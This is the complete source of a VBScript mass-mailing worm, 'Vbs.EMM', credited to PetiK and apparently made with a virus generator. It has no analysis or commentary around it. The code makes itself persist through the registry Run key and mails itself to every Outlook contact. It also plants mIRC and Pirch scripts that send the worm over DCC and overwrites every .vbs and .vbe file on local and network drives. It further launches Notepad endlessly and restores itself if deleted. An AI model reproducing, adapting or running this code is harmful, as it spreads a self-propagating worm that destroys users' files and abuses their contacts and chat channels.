'Vbs.EMM Created By PetiK
On Error Resume Next
Set A39HkW7hp9f = CreateObject("WScript.Shell")
A39HkW7hp9f.regwrite "HKCU\software\EMM\", Chr(87) & Chr(111) & Chr(114) & Chr(109) & Chr(32) & Chr(109) & Chr(97) & Chr(100) & Chr(101) & Chr(32) & Chr(119) & Chr(105) & Chr(116) & Chr(104) & Chr(32) & Chr(86) & Chr(98) & Chr(115) & Chr(119) & Chr(103) & Chr(32) & Chr(49) & Chr(46) & Chr(53) & Chr(48) & Chr(98)
Set A4dxsv4ETC9= Createobject("scripting.filesystemobject")
A4dxsv4ETC9.copyfile wscript.scriptfullname,A4dxsv4ETC9.GetSpecialFolder(1)& "\EMM.vbs"
A39HkW7hp9f.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EMM","wscript.exe "&A4dxsv4ETC9.GetSpecialFolder(1)& "\EMM.vbs %"
if A39HkW7hp9f.regread ("HKCU\software\EMM\mailed") <> "1" then
PB1RYgXdhtJ()
end if
if A39HkW7hp9f.regread ("HKCU\software\EMM\mirqued") <> "1" then
q3azE7BvR9O ""
end if
if A39HkW7hp9f.regread ("HKCU\software\EMM\pirched") <> "1" then
qjO0MUKb34u ""
end if
y14a7WR8Gct()
Do
A39HkW7hp9f.run "notepad",false
loop
Set rZH6uyk8imy= A4dxsv4ETC9.opentextfile(wscript.scriptfullname, 1)
Wiyw00TrrzG= rZH6uyk8imy.readall
rZH6uyk8imy.Close
Do
If Not (A4dxsv4ETC9.fileexists(wscript.scriptfullname)) Then
Set n5U7t01eEEe= A4dxsv4ETC9.createtextfile(wscript.scriptfullname, True)
n5U7t01eEEe.writeWiyw00TrrzG
n5U7t01eEEe.Close
End If
Loop
Function PB1RYgXdhtJ()
On Error Resume Next
Set Bixonu81zUO = CreateObject("Outlook.Application")
If Bixonu81zUO= "Outlook"Then
Set JEpU5JdpWm9=Bixonu81zUO.GetNameSpace("MAPI")
Set Ldxsv4ETC97= JEpU5JdpWm9.AddressLists
For Each LXZb854w076 In Ldxsv4ETC97
If LXZb854w076.AddressEntries.Count <> 0 Then
b1RYgXdhtJq = LXZb854w076.AddressEntries.Count
For I9HkW7hp9f5= 1 To b1RYgXdhtJq
Set IazE7BvR9OJ = Bixonu81zUO.CreateItem(0)
Set yO0MUKb34uW = LXZb854w076.AddressEntries(I9HkW7hp9f5)
IazE7BvR9OJ.To = yO0MUKb34uW.Address
IazE7BvR9OJ.Subject = "Here you have, ;o)"
IazE7BvR9OJ.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
set D4a7WR8GctY=IazE7BvR9OJ.Attachments
D4a7WR8GctY.Add A4dxsv4ETC9.GetSpecialFolder(1)& "\EMM.vbs"
IazE7BvR9OJ.DeleteAfterSubmit = True
If IazE7BvR9OJ.To <> "" Then
IazE7BvR9OJ.Send
A39HkW7hp9f.regwrite "HKCU\software\EMM\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function q3azE7BvR9O(zH6uyk8imys)
On Error Resume Next
if zH6uyk8imys = "" then
if A4dxsv4ETC9.fileexists("c:\mirc\mirc.ini") then zH6uyk8imys="c:\mirc"
if A4dxsv4ETC9.fileexists("c:\mirc32\mirc.ini") then zH6uyk8imys="c:\mirc32"
vyw00TrrzGn=A39HkW7hp9f.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if A4dxsv4ETC9.fileexists(vyw00TrrzGn & "\mirc\mirc.ini") then zH6uyk8imys=vyw00TrrzGn & "\mirc"
end if
if zH6uyk8imys <> "" then
set NU7t01eEEei = A4dxsv4ETC9.CreateTextFile(zH6uyk8imys & "\script.ini", True)
txonu81zUOf="[script]"
txonu81zUOf=txonu81zUOf&vbcrlf&"n0=on 1:JOIN:#:{"
txonu81zUOf=txonu81zUOf&vbcrlf&"n1=  /if ( $nick == $me ) { halt }"
txonu81zUOf=txonu81zUOf&vbcrlf&"n2=  /." & chr(100) & chr(99) & chr(99) & " send $nick "&A4dxsv4ETC9.GetSpecialFolder(1)& "\EMM.vbs" & vbCrLf & "n3=}"
NU7t01eEEei.writeline txonu81zUOf
NU7t01eEEei.close
A39HkW7hp9f.regwrite "HKCU\software\EMM\Mirqued", "1"
end if
end function
function qjO0MUKb34u(MpU5JdpWm9c)
On Error Resume Next
if MpU5JdpWm9c="" then
if A4dxsv4ETC9.fileexists("c:\pirch\Pirch32.exe") then MpU5JdpWm9c="c:\pirch"
if A4dxsv4ETC9.fileexists("c:\pirch32\Pirch32.exe") then MpU5JdpWm9c="c:\pirch32"
BZb854w076l=A39HkW7hp9f.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if A4dxsv4ETC9.fileexists(BZb854w076l & "\pirch\Pirch32.exe") then MpU5JdpWm9c=BZb854w076l & "\pirch\Pirch32.exe"
end if
if MpU5JdpWm9c <> "" then
set jxsv4ETC978= A4dxsv4ETC9.CreateTextFile(MpU5JdpWm9c & "\events.ini", True)
jxsv4ETC978.WriteLine "[Levels]"
jxsv4ETC978.WriteLine "Enabled=1"
jxsv4ETC978.WriteLine "Count=6"
jxsv4ETC978.WriteLine "Level1=000-Unknowns"
jxsv4ETC978.WriteLine "000-UnknownsEnabled=1"
jxsv4ETC978.WriteLine "Level2=100-Level 100"
jxsv4ETC978.WriteLine "100-Level 100Enabled=1"
jxsv4ETC978.WriteLine "Level3=200-Level 200"
jxsv4ETC978.WriteLine "200-Level 200Enabled=1"
jxsv4ETC978.WriteLine "Level4=300-Level 300"
jxsv4ETC978.WriteLine " 300-Level 300Enabled=1"
jxsv4ETC978.WriteLine "Level5=400-Level 400 "
jxsv4ETC978.WriteLine "400-Level 400Enabled=1"
jxsv4ETC978.WriteLine "Level6=500-Level 500"
jxsv4ETC978.WriteLine "500-Level 500Enabled=1"
jxsv4ETC978.WriteLine ""
jxsv4ETC978.WriteLine "[000-Unknowns]"
jxsv4ETC978.WriteLine "UserCount=0"
jxsv4ETC978.WriteLine "EventCount=0"
jxsv4ETC978.WriteLine ""
jxsv4ETC978.WriteLine "[100-Level 100]"
jxsv4ETC978.WriteLine "User1=*!*@*"
jxsv4ETC978.WriteLine "UserCount=1"
jxsv4ETC978.writeline "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick " & A4dxsv4ETC9.GetSpecialFolder(1) & "\EMM.vbs"
jxsv4ETC978.WriteLine "EventCount=1"
jxsv4ETC978.WriteLine ""
jxsv4ETC978.WriteLine "[200-Level 200]"
jxsv4ETC978.WriteLine "UserCount=0"
jxsv4ETC978.WriteLine "EventCount=0"
jxsv4ETC978.WriteLine ""
jxsv4ETC978.WriteLine "[300-Level 300]"
jxsv4ETC978.WriteLine "UserCount=0"
jxsv4ETC978.WriteLine "EventCount=0"
jxsv4ETC978.WriteLine ""
jxsv4ETC978.WriteLine "[400-Level 400]"
jxsv4ETC978.WriteLine "UserCount=0"
jxsv4ETC978.WriteLine "EventCount=0"
jxsv4ETC978.WriteLine ""
jxsv4ETC978.WriteLine "[500-Level 500]"
jxsv4ETC978.WriteLine "UserCount=0"
jxsv4ETC978.WriteLine "EventCount=0"
jxsv4ETC978.close
A39HkW7hp9f.regwrite "HKCU\software\EMM\pirched", "1"
end if
end function
Function y14a7WR8Gct()
On Error Resume Next
Set YHkW7hp9f5C = A4dxsv4ETC9.Drives
For Each ERYgXdhtJqu In YHkW7hp9f5C
If ERYgXdhtJqu.Drivetype = Remote Then
hzE7BvR9OJE= ERYgXdhtJqu & "\"
Call o0MUKb34uWs(hzE7BvR9OJE)
ElseIf ERYgXdhtJqu.IsReady Then
hzE7BvR9OJE= ERYgXdhtJqu&"\"
Call o0MUKb34uWs(hzE7BvR9OJE)
End If
Next
End Function
Function o0MUKb34uWs(La7WR8GctY3)
zw00TrrzGnm=La7WR8GctY3
Set h6uyk8imys1= A4dxsv4ETC9.GetFolder(zw00TrrzGnm)
Set J7t01eEEei2= h6uyk8imys1.Files
For Each gonu81zUOfM In J7t01eEEei2
if A4dxsv4ETC9.GetExtensionName(gonu81zUOfM.path) = "vbs" then
A4dxsv4ETC9.copyfile wscript.scriptfullname , gonu81zUOfM.path , true
end if
if A4dxsv4ETC9.GetExtensionName(gonu81zUOfM.path) = "vbe" then
A4dxsv4ETC9.copyfile wscript.scriptfullname , gonu81zUOfM.path , true
end if
if gonu81zUOfM.name = "mirc.ini" then
q3azE7BvR9O(gonu81zUOfM.ParentFolder)
end if
if gonu81zUOfM.name = "Pirch32.exe" then
qjO0MUKb34u(gonu81zUOfM.ParentFolder)
end if
Next
Set gonu81zUOfM= h6uyk8imys1.SubFolders
For Each lU5JdpWm9cB In gonu81zUOfM
Call o0MUKb34uWs(lU5JdpWm9cB.path)
Next
End Function
'Vbswg 1.50b
